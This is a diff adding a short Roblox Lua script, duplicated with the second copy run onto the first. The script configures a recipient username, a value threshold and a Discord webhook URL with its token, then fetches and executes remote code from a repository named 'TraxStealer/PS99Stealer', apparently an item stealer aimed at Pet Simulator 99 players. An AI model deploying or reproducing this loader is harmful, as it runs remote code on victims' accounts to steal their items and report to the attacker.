@@ -1,0 +1,11 @@
+Username = "khai147433"
+Username2 = "khai147433"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1355003689127116811/6cr4ghuapemqDtOLPSzn7NqWjVoTbyPUN9hYqRsWXooPw3d_sIKowuQEhZvUPmj1xTau"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()Username = "khai147433"
+Username2 = "khai147433"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1355003689127116811/6cr4ghuapemqDtOLPSzn7NqWjVoTbyPUN9hYqRsWXooPw3d_sIKowuQEhZvUPmj1xTau"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
